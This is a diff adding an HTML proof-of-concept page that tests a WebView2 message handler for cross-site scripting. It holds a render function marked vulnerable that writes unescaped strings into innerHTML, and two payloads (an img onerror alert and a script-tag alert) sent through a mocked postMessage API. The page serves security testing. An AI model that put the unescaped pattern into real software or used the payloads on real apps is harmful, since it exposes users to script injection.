@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>WebView2 Message Injection Test</title>
+</head>
+<body style="background:#111; color:#eee; font-family:monospace;">
+<h2>WebView2 Message Event Test</h2>
+<div id="appsContainer" style="border:1px solid #555; padding:10px; margin:10px;">
+<b>Apps Container:</b>
+</div>
+<div id="toolsContainer" style="border:1px solid #555; padding:10px; margin:10px;">
+<b>Tools Container:</b>
+</div>
+ 
+  <script>
+    // --- vulnerable render function ---
+    function renderApps(list, containerId) {
+      const container = document.getElementById(containerId);
+      list.forEach(item => {
+        container.innerHTML += `<div>${item}</div>`;
+      });
+    }
+ 
+
+    window.chrome = {
+      webview: {
+        postMessage: (msg) => {
+          const event = { data: msg };
+          if (typeof window.chrome.webview._listener === "function") {
+            window.chrome.webview._listener(event);
+          }
+        },
+        addEventListener: (evt, fn) => {
+          if (evt === "message") {
+            window.chrome.webview._listener = fn;
+          }
+        }
+      }
+    };
+ 
+    // --- your event listener code ---
+    window.chrome?.webview?.addEventListener("message", (event) => {
+      const data = event.data;
+      if (data.action === "populateTabs") {
+        if (Array.isArray(data.apps)) {
+          renderApps(data.apps, "appsContainer");
+        }
+        if (Array.isArray(data.tools)) {
+          renderApps(data.tools, "toolsContainer");
+        }
+      }
+    });
+ 
+   
+    window.chrome.webview.postMessage({
+      action: "populateTabs",
+      apps: ['<img src=x onerror="alert(`Apps XSS`)">'],
+      tools: []
+    });
+ 
+   
+    window.chrome.webview.postMessage({
+      action: "populateTabs",
+      apps: [],
+      tools: ['<script>alert(`Tools XSS`)</script>']
+    });
+</script>
+</body>
+</html>
